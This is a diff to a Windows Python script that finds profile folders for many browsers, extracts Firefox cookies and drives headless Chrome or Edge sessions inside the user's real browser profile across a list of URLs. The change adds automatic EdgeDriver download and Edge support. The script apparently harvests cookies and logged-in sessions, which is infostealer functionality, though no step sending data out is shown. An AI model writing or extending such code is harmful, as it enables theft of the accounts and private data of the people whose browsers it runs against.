@@ -1,16 +1,21 @@
 import os
-import sqlite3
-import shutil
+import zipfile
 import tempfile
+import requests
+import shutil
+import subprocess
+import win32api
+import sqlite3
 from pathlib import Path
 from urllib.parse import urlparse
 import ipaddress
-import requests
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from selenium import webdriver
+import psutil
 from selenium.webdriver.chrome.options import Options
 from selenium.webdriver.support.ui import WebDriverWait
-import psutil
+from selenium.webdriver.edge.service import Service as EdgeService
+from selenium.webdriver.edge.options import Options as EdgeOptions
 
 ExcludedHosts = {
     "localhost", "127.0.0.1", "::1", "0.0.0.0", "10.0.0.0", "100.64.0.0", "127.0.0.0",
@@ -18,6 +23,21 @@ ExcludedHosts = {
     "198.18.0.0", "198.51.100.0", "203.0.113.0", "224.0.0.0", "240.0.0.0", "255.255.255.255",
     "::", "100::", "2001::", "2001:db8::", "fc00::", "fe80::", "ff00::"
 }
+
+# EdgeDriver Install shit
+InstallDir = r"C:\WebDrivers"
+os.makedirs(InstallDir, exist_ok=True)
+DriverPath = os.path.join(InstallDir, "msedgedriver.exe")
+
+def GetEdgeVersion() -> str:
+    output = subprocess.check_output(r'reg query "HKEY_CURRENT_USER\Software\Microsoft\Edge\BLBeacon" /v version', shell=True, text=True)
+    return output.strip().split()[-1]
+
+def GetFileVersion(file_path: str) -> str:
+    info = win32api.GetFileVersionInfo(file_path, "\\")
+    ms = info['FileVersionMS']
+    ls = info['FileVersionLS']
+    return f"{ms >> 16}.{ms & 0xFFFF}.{ls >> 16}.{ls & 0xFFFF}"
 
 def FindBrowserPaths(): # NOT ALL TESTED
     Env = {"LOCALAPPDATA": os.environ["LOCALAPPDATA"], "APPDATA": os.environ["APPDATA"]}
@@ -35,7 +55,7 @@ def FindBrowserPaths(): # NOT ALL TESTED
         "CHROME_SXS": (r"C:\Program Files (x86)\Google\Chrome SxS\Application\chrome.exe", ["LOCALAPPDATA", "Google", "Chrome SxS", "User Data"]),
         # "CHROME": (r"C:\Program Files\Google\Chrome\Application\chrome.exe", ["LOCALAPPDATA", "Google", "Chrome", "User Data"]), # Not Working ( Default Profile Poopy :sob: )
         "EPIC_PRIVACY_BROWSER": (r"%LOCALAPPDATA%\Epic Privacy Browser\Application\epic.exe", ["LOCALAPPDATA", "Epic Privacy Browser", "User Data"]),
-        "MICROSOFT_EDGE": (r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe", ["LOCALAPPDATA", "Microsoft", "Edge", "User Data"]),
+        "MICROSOFT_EDGE": (r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe", ["LOCALAPPDATA", "Microsoft", "Edge", "User Data"]), # TESTED WORKING
         "URAN": (r"%LOCALAPPDATA%\Uran\Application\uran.exe", ["LOCALAPPDATA", "Uran", "User Data"]),
         "YANDEX": (r"%LOCALAPPDATA%\Yandex\YandexBrowser\Application\browser.exe", ["LOCALAPPDATA", "Yandex", "YandexBrowser", "User Data"]),
         "BRAVE": (r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe", ["LOCALAPPDATA", "BraveSoftware", "Brave-Browser", "User Data"]), # TESTED WORKING
@@ -143,16 +163,52 @@ def FilterUrlsConcurrently(Urls): # Filter URLs since Selenium stops on websites
     print(f"\nCompleted. {len(Filtered)} URLs remain after filtering.")
     return Filtered
 
-def CreateDriver(ExePath, UserDataDir):
-    OptionsObj = Options()
-    OptionsObj.binary_location = ExePath
-    OptionsObj.add_argument(f"--user-data-dir={UserDataDir}")
-    OptionsObj.add_argument("--profile-directory=Default")
-    OptionsObj.add_argument("--no-sandbox")
-    OptionsObj.add_argument("--disable-dev-shm-usage")
-    OptionsObj.add_argument("--headless=new")
-    OptionsObj.page_load_strategy = "eager"
-    return webdriver.Chrome(options=OptionsObj)
+def CreateDriver(ExePath, UserDataDir, BrowserName):
+    if BrowserName == "MICROSOFT_EDGE":
+        EdgeVersion = GetEdgeVersion()
+        # print(f"Edge version: {EdgeVersion}")
+
+        NeedDownload = True
+        if os.path.isfile(DriverPath):
+            DriverVersion = GetFileVersion(DriverPath)
+            # print(f"Existing EdgeDriver version: {DriverVersion}")
+            if DriverVersion.startswith(EdgeVersion):
+                NeedDownload = False
+                # print("EdgeDriver is up to date.")
+
+        if NeedDownload:
+            DriverUrl = f"https://msedgedriver.microsoft.com/{EdgeVersion}/edgedriver_win64.zip"
+            with tempfile.TemporaryDirectory() as TmpDir:
+                ZipPath = os.path.join(TmpDir, "edgedriver.zip")
+                response = requests.get(DriverUrl)
+                response.raise_for_status()
+                with open(ZipPath, "wb") as f:
+                    f.write(response.content)
+                with zipfile.ZipFile(ZipPath, "r") as zip_ref:
+                    zip_ref.extractall(TmpDir)
+                ExtractedDriver = os.path.join(TmpDir, "msedgedriver.exe")
+                shutil.copy2(ExtractedDriver, DriverPath)
+            # print(f"EdgeDriver installed: {DriverPath}")
+
+        options = EdgeOptions()
+        options.binary_location = ExePath
+        options.add_argument(f"--user-data-dir={UserDataDir}")
+        options.add_argument("--profile-directory=Default")
+        options.add_argument("--headless=new")
+        options.page_load_strategy = "eager"
+        service = EdgeService(executable_path=DriverPath)
+        return webdriver.Edge(service=service, options=options)
+    else:
+        options = Options()
+        options.binary_location = ExePath
+        options.add_argument(f"--user-data-dir={UserDataDir}")
+        options.add_argument("--profile-directory=Default")
+        options.add_argument("--no-sandbox")
+        options.add_argument("--disable-dev-shm-usage")
+        options.add_argument("--headless=new")
+        options.page_load_strategy = "eager"
+        return webdriver.Chrome(options=options)
+
 
 def ExtractFirefoxCookies(ProfilePath):
     TempPath = tempfile.mktemp()
@@ -198,7 +254,8 @@ def Main():
             Urls = FilterUrlsConcurrently(Urls)
 
             try:
-                Driver = CreateDriver(Paths["EXE_PATH"], Paths["USER_DATA_DIR"])
+                # Driver = CreateDriver(Paths["EXE_PATH"], Paths["USER_DATA_DIR"])
+                Driver = CreateDriver(Paths["EXE_PATH"], Paths["USER_DATA_DIR"], Name)
             except Exception as e:
                 print(f"Failed to create driver for {Name}: {e}")
                 continue
